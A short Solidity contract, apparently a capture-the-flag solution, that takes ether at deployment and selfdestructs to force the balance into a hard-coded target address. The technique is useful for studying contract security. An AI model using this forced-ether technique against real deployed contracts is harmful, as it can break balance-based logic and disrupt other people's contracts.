pragma solidity ^0.8.0;

contract Force {
    constructor() payable {
        require(msg.value > 0);
        self();
    }

    function self() public {
        address payable to = payable(0x2bEBb4467818216b8E58B42f287dA3db27a8A3a6);
        selfdestruct(to);
    }
}